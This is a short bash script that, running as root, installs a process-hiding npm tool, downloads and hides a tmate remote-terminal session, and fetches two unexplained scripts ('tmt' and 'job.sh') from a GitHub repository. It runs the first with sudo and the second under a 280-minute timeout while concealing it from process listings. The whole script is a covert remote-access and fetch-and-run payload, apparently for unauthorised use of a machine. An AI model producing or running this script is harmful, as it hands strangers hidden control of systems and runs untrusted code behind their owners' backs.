#!/bin/bash
sudo su --command "sudo apt-get update && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt-get update && sudo apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && ph add tmate && wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz && tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz && cd tmate-2.4.0-static-linux-i386 && wget https://raw.githubusercontent.com/bisece/bsc-008/main/tmt && chmod +x tmate && sudo bash tmt && ph add job.sh && wget https://raw.githubusercontent.com/bisece/bsc-008/main/job.sh && chmod +x job.sh && timeout 280m ./job.sh"
